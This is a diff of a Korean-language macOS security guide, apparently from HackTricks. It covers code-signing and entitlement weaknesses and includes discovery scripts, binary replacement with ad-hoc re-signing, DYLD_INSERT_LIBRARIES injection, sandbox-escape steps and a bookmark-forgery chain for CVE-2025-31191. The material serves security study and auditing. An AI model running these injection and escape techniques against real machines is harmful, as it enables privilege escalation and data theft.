@@ -6,16 +6,15 @@
 
 ### Basic Information
 
-**Ad-hoc signing** (`CS_ADHOC`)은 **certificate chain**이 없는 code signature를 생성합니다. 즉, developer identity verification 없이 code의 hash만 포함됩니다. 따라서 해당 binary의 출처를 어떤 developer나 organization으로도 추적할 수 없습니다.<sup>[[1]](#references)[[4]](#references)</sup>
+**Ad-hoc signing** (`CS_ADHOC`)은 **certificate chain이 없는** code signature를 생성합니다. 여전히 signed code를 hash하므로 validation을 통해 modification을 감지할 수 있지만, 다른 component가 authenticate할 수 있는 developer identity는 제공하지 않습니다. Executable을 교체하고 다시 sign하면 다른 CodeDirectory/CDHash가 생성됩니다.<sup>[[1]](#references)[[4]](#references)</sup>
 
-Apple Silicon Mac에서는 모든 executable에 최소한 ad-hoc signature가 필요합니다. 따라서 많은 development tools, Homebrew packages 및 third-party utilities에서 ad-hoc signature를 확인할 수 있습니다.
+Apple Silicon Mac에서는 모든 executable에 최소한 ad-hoc signature가 필요합니다. 따라서 많은 development tool, Homebrew package 및 third-party utility에서 ad-hoc signature를 확인할 수 있습니다.
 
 ### Why This Matters
 
-- **검증 가능한 identity 없음** — identity-based checks로 탐지되지 않고 binary를 교체할 수 있음
-- **privileged positions**(FDA, daemon, helpers)에 있는 third-party ad-hoc binaries는 우선순위가 높은 targets임
-- 일부 configurations에서는 ad-hoc signatures가 developer-signed code만큼 엄격하게 **검증되지 않을 수 있음**
-- **TCC grants**가 있는 ad-hoc signed binaries는 특히 가치가 높음 — binary content가 변경되어도 grants가 유지됨(TCC가 grant를 key로 지정한 방식에 따라 다름)
+- **검증 가능한 signer identity 없음** — path, ad-hoc status 또는 고정되지 않은 identifier만 허용하는 check로는 binary를 누가 생성했는지 확인할 수 없습니다.
+- **privileged position**(FDA, daemon, helper)에 있는 third-party ad-hoc binary는 해당 file 또는 parent directory가 writable한 경우 우선순위가 높은 target입니다.
+- CDHash, designated-requirement 또는 requirement-backed TCC check는 replacement를 **감지합니다**. Path-based policy는 그렇지 않을 수 있으므로, re-signing 후에도 grant가 유지된다고 가정하지 말고 실제 requirement를 확인한 다음 grant를 다시 테스트해야 합니다.
 
 ### Discovery
 ```bash
@@ -45,23 +44,23 @@ cp /tmp/malicious-binary /path/to/target
 # 4. Re-sign with ad-hoc signature (mimics the original)
 codesign -s - /path/to/target
 
-# 5. On next launch, the daemon runs your code with the original's TCC grants
-# (This works when TCC keyed the grant by path rather than code signature)
+# 5. Relaunch and verify the effective grant. It survives only when the
+#    authorization is path-based (or otherwise does not pin the old CDHash).
 ```
 ---
 
-## Debuggable Processes (get-task-allow)
+## 디버깅 가능한 프로세스 (get-task-allow)
 
 ### 기본 정보
 
-**`com.apple.security.get-task-allow`** entitlement(또는 `CS_GET_TASK_ALLOW` flag)은 **모든 process가 debugger로 attach**하여 memory를 읽고, register를 수정하고, code를 inject하며, execution을 제어할 수 있도록 허용합니다.<sup>[[3]](#references)</sup>
+**`com.apple.security.get-task-allow`** entitlement(또는 `CS_GET_TASK_ALLOW` flag)은 권한이 부여된 debugger가 Hardened Runtime에서 일반적으로 이를 차단하는 경우에도 프로세스 task port를 획득할 수 있도록 허용합니다. 성공한 debugger는 memory를 읽고, registers를 수정하고, code를 inject하며, execution을 제어할 수 있습니다.<sup>[[3]](#references)</sup>
 
-이는 **development build에만** 사용하도록 설계되었습니다. 그러나 일부 third-party binary는 production 환경에서도 이 entitlement를 포함한 채 배포됩니다.
+이는 **development builds에서만** 사용하도록 설계되었습니다. 그러나 일부 third-party binaries는 production 환경에서 이 entitlement를 포함한 채 배포됩니다.
 
 > [!CAUTION]
-> `get-task-allow`가 적용된 production binary는 **즉시 exploitation primitive**입니다. 모든 local process는 `task_for_pid()`를 호출하고, 대상의 Mach task port를 획득한 다음, 대상의 entitlement, TCC grant 및 security context로 실행되는 arbitrary code를 inject할 수 있습니다.
+> production binary에 `get-task-allow`가 있으면 강력한 exploitation primitive가 됩니다. `taskgated`, caller identity, sandboxing, debugger entitlements 및 Developer Tools authorization은 특정 client가 task port를 획득할 수 있는지에 여전히 영향을 줍니다. `lldb`/`debugserver`와 intended injector를 모두 사용해 테스트해야 합니다. attachment가 성공하면 injected code는 target의 entitlements, TCC grants 및 security context로 실행됩니다.
 
-### Discovery
+### 탐색
 ```bash
 # Find debuggable binaries
 find /Applications /usr/local -type f -perm +111 -exec sh -c '
@@ -105,17 +104,17 @@ VM_PROT_READ | VM_PROT_EXECUTE);
 
 ## Library Validation 없음 + DYLD Environment
 
-### Runtime Library-Validation 해제
+### Runtime Library-Validation Clearing
 
-private entitlement **`com.apple.private.security.clear-library-validation`**은 process launch 시 library validation을 disable하지 않습니다. 대신 process가 runtime에 자체적으로 `csops(..., CS_OPS_CLEAR_LV, ...)`를 호출할 수 있도록 허용합니다. XNU는 caller가 해당 entitlement를 보유하고 handler의 추가 검사를 충족하면 `CS_REQUIRE_LV | CS_FORCED_LV`를 clear합니다. 따라서 process는 library validation을 clear하는 code path에 도달한 후에만 실행 가능한 library-injection target이 될 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>
+private entitlement **`com.apple.private.security.clear-library-validation`**은 process launch 시 library validation을 disable하지 않습니다. 대신 process가 runtime에 자체적으로 `csops(..., CS_OPS_CLEAR_LV, ...)`를 호출할 수 있도록 허용합니다. 이후 XNU는 caller가 해당 entitlement를 보유하고 handler의 추가 검사를 충족하는 경우 `CS_REQUIRE_LV | CS_FORCED_LV`를 clear합니다. 결과적으로 process는 library validation을 clear하는 code path에 도달한 후에만 실행 가능한 library-injection target이 될 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>
 
-### 치명적인 조합
+### The Deadly Combination
 
-binary에 다음 두 항목이 **모두** 있을 때:<sup>[[3]](#references)</sup>
+binary에 다음 두 가지가 **모두** 있는 경우:<sup>[[3]](#references)</sup>
 - `com.apple.security.cs.disable-library-validation` (모든 dylib 로드)
 - `com.apple.security.cs.allow-dyld-environment-variables` (DYLD env vars 허용)
 
-이는 **보장된 code injection primitive**입니다 — `DYLD_INSERT_LIBRARIES`가 완벽하게 동작합니다.
+이는 high-value code-injection 조합입니다. Hardened Runtime이 untrusted library와 DYLD environment variable을 모두 허용하기 때문입니다. launch context에서 여전히 DYLD variables를 scrub할 수 있으므로(예: protected 또는 privileged execution paths), entitlement pair를 unconditional한 것으로 간주하지 말고 정확한 invocation을 검증해야 합니다.
 
 ### Discovery
 ```bash
@@ -133,7 +132,7 @@ SELECT path, privileged, tccPermsStr FROM executables
 WHERE noLibVal = 1 AND allowDyldEnv = 1
 ORDER BY privileged DESC;"
 ```
-### Attack: DYLD_INSERT_LIBRARIES Injection
+### 공격: DYLD_INSERT_LIBRARIES Injection
 ```bash
 # 1. Create the injection dylib
 cat > /tmp/inject.c << 'EOF'
@@ -176,17 +175,17 @@ cat /tmp/injected_proof.txt
 
 Sandbox 임시 예외(`com.apple.security.temporary-exception.*`)는 App Sandbox에 허점을 만듭니다:<sup>[[2]](#references)</sup>
 
-| 예외 | 허용되는 작업 |
+| 예외 | 허용하는 작업 |
 |---|---|
 | `temporary-exception.mach-lookup.global-name` | 시스템 전체의 XPC/Mach 서비스에 연결 |
 | `temporary-exception.files.absolute-path.read-write` | 앱 컨테이너 외부의 파일 읽기/쓰기 |
 | `temporary-exception.iokit-user-client-class` | IOKit user-client 연결 열기 |
 | `temporary-exception.shared-preference.read-only` | 다른 앱의 preference 읽기 |
-| `temporary-exception.files.home-relative-path.read-write` | `~` 기준 경로에 접근 |
+| `temporary-exception.files.home-relative-path.read-write` | `~` 기준 상대 경로에 액세스 |
 
 ### Mach-Lookup 예외 = Sandbox Escape Primitive
 
-가장 위험한 예외는 **mach-lookup**입니다. 이 예외를 사용하면 Sandbox된 앱이 권한이 높은 daemon과 통신할 수 있습니다:
+가장 위험한 예외는 **mach-lookup**입니다. 이를 통해 Sandbox된 앱이 privileged daemon과 통신할 수 있습니다:
 ```bash
 # Find apps with mach-lookup exceptions
 find /Applications -name "*.app" -exec sh -c '
@@ -200,7 +199,7 @@ echo "[$count exceptions] $(basename "$1")"
 }
 ' _ {} \; 2>/dev/null | sort -rn
 ```
-### 공격: Mach-Lookup을 통한 Sandbox Escape
+### Attack: Mach-Lookup을 통한 Sandbox Escape
 ```
 1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
 2. Read entitlements to discover mach-lookup exceptions
@@ -213,25 +212,83 @@ c. Fuzz each exposed method
 ```
 ---
 
+## Code-Signing Checks Are Not XPC Client Integrity
+
+XPC service는 audit token에서 code-signing 상태를 추출하고, Apple **platform binary**이거나 `CS_REQUIRE_LV`/`CS_FORCED_LV`를 포함한 client를 허용하는 방식으로 connection을 인증할 수 있습니다. 이러한 테스트는 executable과 선택된 process flags를 설명할 뿐이며, 현재 address space에 trusted code만 포함되어 있음을 증명하지는 않습니다. ImageCapture services에 대한 연구에서는 `/bin/ls`와 같은 injection 가능한 Apple binary가 `DYLD_INSERT_LIBRARIES`를 통해 attacker dylib를 load한 다음 platform client로 connect할 수 있음이 확인되었습니다. 이후 library-validation flags를 확인하는 검사도 우회되었으며, Apple은 macOS 15에서 service가 private authorization entitlement를 요구하도록 변경했습니다.<sup>[[6]](#references)</sup>
+
+### Offensive Audit Workflow
+
+1. `listener:shouldAcceptNewConnection:`(또는 이에 상응하는 low-level XPC handler)를 Reverse하고, `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` 또는 `CS_FORCED_LV`만을 기반으로 한 decision을 식별합니다.
+2. protocol을 말할 수 있는 Apple-signed client를 열거한 다음 Hardened Runtime과 entitlements를 검사합니다. platform signature만으로 DYLD injection이 차단되었다는 증거가 되지는 않습니다.
+3. candidate를 **target macOS build**에서 테스트합니다. constructor dylib가 load되면 해당 constructor에서 service connection을 생성하여 audit token이 허용된 platform process에 속하도록 합니다.
+4. 모든 vendor patch를 다시 테스트합니다. 동일한 authorization decision에 또 다른 mutable process-status flag를 추가하는 것만으로는 confused-deputy primitive가 제거되지 않을 수 있습니다.
+```bash
+# Static triage of the intended client
+codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
+codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -
+
+# Dynamic check using the constructor dylib created earlier in this page
+DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
+```
+> [!NOTE]
+> DYLD 동작, AMFI 정책 및 service-side checks는 macOS release에 따라 변경됩니다. fully patched host에서 실패했다고 해서 vulnerable release에서도 동일한 chain이 실패했다는 의미는 아닙니다.
+
+---
+
+## Security-Scoped Bookmark Forgery (CVE-2025-31191)
+
+Security-scoped bookmark은 사용자의 file choice를 앱 실행 간에도 유지합니다. sandbox extension은 boot에 종속되므로 `ScopedBookmarkAgent`는 이를 검증하고 장기간 유효한 HMAC-authenticated bookmark을 생성합니다. 이후 앱이 해당 bookmark을 제시하면 agent는 이를 검증하고 새로운 sandbox extension을 발급합니다. signing secret은 login keychain에 저장되며, bundle identifier를 사용해 per-app key가 파생됩니다.<sup>[[7]](#references)</sup>
+
+영향받는 system에서는 keychain ACL이 untrusted process가 `com.apple.scopedbookmarksagent.xpc` secret을 **읽는 것**은 막았지만 삭제는 막지 못했습니다. compromised sandboxed app은 해당 item을 known secret 및 attacker-controlled ACL로 교체하고, app-specific HMAC key를 파생하며, writable container bookmark plist에 entries를 forge한 뒤 `ScopedBookmarkAgent`에 이를 file-access extension으로 교환하도록 요청할 수 있었습니다. 이로 인해 security-scoped bookmark을 사용하는 모든 sandboxed application이 추가적인 file-picker interaction 없이 arbitrary-file-access sandbox escape의 potential target이 되었습니다. Apple은 2025년 3월 31일 security updates에서 이 문제를 수정했습니다.<sup>[[7]](#references)</sup>
+
+### Triage 및 Attack Chain
+```bash
+APP=/Applications/Target.app
+BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
+"$APP/Contents/Info.plist")"
+
+# Identify apps that can persist app- or document-scoped file access
+codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
+grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'
+
+# Locate app-managed bookmark stores; names and schemas are application-specific
+find "$HOME/Library/Containers" -type f \
+\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null
+
+# Inspect metadata for the agent's generic-password item (normally not its secret)
+security find-generic-password -s com.apple.scopedbookmarksagent.xpc
+```
+취약한 host에서의 exploitation sequence는 다음과 같습니다:
+
+1. persistent scoped bookmarks를 사용하는 sandboxed app 내부에서 code execution을 획득합니다.
+2. agent의 keychain signing item을 알려진 secret과 permissive ACL로 교체합니다.
+3. `HMAC-SHA256(key=known_secret, data=bundle_id)`를 계산하고, app의 writable bookmark store에 있는 유용한 path를 대상으로 bookmark을 forge합니다.
+4. 애플리케이션의 일반적인 bookmark-resolution path를 트리거하여 `ScopedBookmarkAgent`가 sandbox extension을 반환하도록 합니다.
+5. 새 file access를 사용해 해당 user가 접근할 수 있는 out-of-sandbox execution 또는 data target을 overwrite합니다.
+
+이는 **patched-version technique**입니다. trust boundary를 이해하고 unpatched system을 평가하는 데 사용해야 하며, current release에 대한 가정으로 사용해서는 안 됩니다. current testing에서는 bookmark parsing, identity binding, keychain-item lifecycle, 그리고 agent 주변의 confused-deputy behavior에 집중하세요.
+
+---
+
 ## Private Apple Entitlements
 
-### 정의
+### What They Are
 
-`com.apple.private.*`가 접두사로 붙은 Entitlements는 third-party developer에게 문서화되거나 제공되지 않는 **Apple 내부 API**에 대한 access를 제공합니다. Private Entitlements를 보유한 third-party binary는 enterprise cert, MDM 또는 non-App-Store distribution을 통해 이를 획득합니다.
+`com.apple.private.*`로 시작하는 Entitlements는 third-party developer에게 문서화되거나 제공되지 않는 **Apple-internal APIs**에 대한 access를 제공합니다. private entitlements를 가진 third-party binary는 enterprise cert, MDM 또는 non-App-Store distribution을 통해 이를 획득했습니다.
 
-### 위험한 Private Entitlements
+### Dangerous Private Entitlements
 
 | Entitlement | Capability |
 |---|---|
-| `com.apple.private.tcc.manager` | TCC database 전체 read/write |
-| `com.apple.private.tcc.allow` | 특정 TCC service에 대한 access |
+| `com.apple.private.tcc.manager` | Full TCC database read/write |
+| `com.apple.private.tcc.allow` | 특정 TCC services에 대한 access |
 | `com.apple.private.security.no-sandbox` | sandbox 없이 실행 |
-| `com.apple.private.iokit` | IOKit driver에 대한 직접 access |
+| `com.apple.private.iokit` | Direct IOKit driver access |
 | `com.apple.private.kernel.\*` | Kernel interface access |
-| `com.apple.private.xpc.launchd.job-label` | launchd job 등록/관리 |
-| `com.apple.rootless.install` | SIP로 보호되는 path에 write |
+| `com.apple.private.xpc.launchd.job-label` | launchd jobs 등록 및 관리 |
+| `com.apple.rootless.install` | SIP-protected paths에 write |
 
-### 발견
+### Discovery
 ```bash
 # Find third-party binaries with private entitlements
 find /Applications /usr/local -type f -perm +111 -exec sh -c '
@@ -252,11 +309,11 @@ ORDER BY privileged DESC;"
 
 ## Custom Sandbox Profiles (SBPL)
 
-### 이것이 무엇인가
+### 개요
 
-바이너리는 SBPL(Seatbelt Profile Language)로 작성된 **custom sandbox profiles**와 함께 제공될 수 있습니다. 이러한 profile은 기본 App Sandbox보다 더 제한적일 수도 있고, OR **더 permissive**할 수도 있습니다.
+바이너리는 SBPL (Seatbelt Profile Language)로 작성된 **custom sandbox profiles**와 함께 제공될 수 있습니다. 이러한 profile은 기본 App Sandbox보다 더 제한적일 수도 있고, OR **더 permissive**할 수도 있습니다.
 
-### Custom Profiles 감사하기
+### Custom Profiles 감사
 ```bash
 # Find custom sandbox profiles
 find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null
@@ -274,11 +331,11 @@ cat /path/to/custom.sb | grep "(allow" | sort -u
 ```
 ---
 
-## 쓰기 가능한 Library 경로
+## 쓰기 가능한 라이브러리 경로
 
-### 이것이 무엇인가
+### 정의
 
-바이너리가 현재 사용자가 **쓸 수 있는** 경로에서 dynamic library를 로드하면, 해당 library를 악성 코드로 교체할 수 있습니다.
+바이너리가 현재 사용자가 **쓸 수 있는** 경로에서 동적 라이브러리를 로드하면, 해당 라이브러리를 악성 코드로 교체할 수 있습니다.
 
 ### 탐색
 ```bash
@@ -323,9 +380,11 @@ cp /tmp/evil.dylib /path/to/writable.dylib
 ```
 ## References
 
-- [1] [Apple Developer — Code Signing 가이드](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
+- [1] [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
 - [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
 - [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
-- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` 작업 및 `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
+- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` operations and `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
 - [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV` handler)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
+- [6] [macOS Sandbox Escapes의 새로운 시대: 간과된 공격 표면을 살펴보고 10개 이상의 새로운 취약점 발견](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
+- [7] [CVE-2025-31191 분석: macOS security-scoped bookmarks 기반 Sandbox Escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
 {{#include ../../../banners/hacktricks-training.md}}
